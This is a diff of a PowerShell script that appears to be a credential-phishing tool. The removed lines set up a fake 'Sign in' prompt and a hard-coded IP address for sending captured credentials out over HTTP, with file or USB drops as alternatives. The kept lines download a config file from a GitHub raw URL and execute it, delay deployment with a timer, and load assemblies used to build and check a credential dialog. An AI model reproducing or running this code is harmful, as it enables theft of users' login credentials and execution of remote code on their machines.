@@ -1,38 +1,3 @@
-param (
-    [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
-    [string]$Caption = 'Sign in',
-
-    [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
-    [string]$Message = 'Enter your credentials',
-
-    [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
-    [string]$Server = "46.161.53.115",
-
-    [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
-    [string]$Port = "80",
-
-    [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
-    [string]$delivery = "http",
-
-    [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
-    [string]$filename = "c:\users\public\1.txt",
-
-    [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
-    [string]$usblabel = "YOURUSB",
-
-    [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
-    [string]$mode = "dynamic",
-
-    [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
-    [string]$timer = $null,
-
-    [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
-    [string]$override = $null
-)
-
-# Find and Load config file. Default to local if available but switches to web config if local not found. Can manually set Local or Web
-#by setting mode and delivery options respectiviley
-
 if ([string]::IsNullOrEmpty($override)) {
     $temp = $env:TEMP
     $volumes = get-volume | where-Object { $_.DriveType -contains "Removable" } | select DriveLetter
@@ -47,11 +12,9 @@ if ([string]::IsNullOrEmpty($override)) {
 if ([string]::IsNullOrEmpty($path)) {
     Invoke-RestMethod -uri "https://raw.githubusercontent.com/br1337/Scripts/main/conf.cl" -OutFile $temp"\cl_params.ps1"
 }
-# If being used, load config file
 if (Test-Path -Path $temp"cl_params.ps1") {
     . $temp"\cl_params.ps1"
 }
-# Set Mode - Static, Dynamic, or Config File
 
 switch ($mode) {
     static { $method = $delivery }
@@ -66,13 +29,11 @@ switch ($mode) {
 
 }
 
-# Time delay before deployment?
-
 if ($timer) {
     $timer = ($timer -as [int])*60
     Start-Sleep -s $timer
 }
-# Add Assemblies and Initiate Count Down
+
 Add-Type -AssemblyName System.Runtime.WindowsRuntime
 Add-Type -AssemblyName System.DirectoryServices.AccountManagement
 $asTaskGeneric = ([System.WindowsRuntimeSystemExtensions].GetMethods() | ? { $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1' })[0]
